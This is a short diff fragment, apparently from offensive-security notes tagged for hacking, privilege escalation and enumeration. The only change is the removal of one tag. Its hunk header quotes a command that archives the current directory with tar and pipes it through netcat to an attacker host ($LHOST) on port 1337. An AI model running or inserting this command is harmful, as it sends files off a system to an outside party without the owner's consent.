@@ -14,4 +14,4 @@ tar -cf - . | nc $LHOST 1337
 
 Tags:
 
-    #assorted #command #hacking #privesc #enumeration
+    #command #hacking #privesc #enumeration 
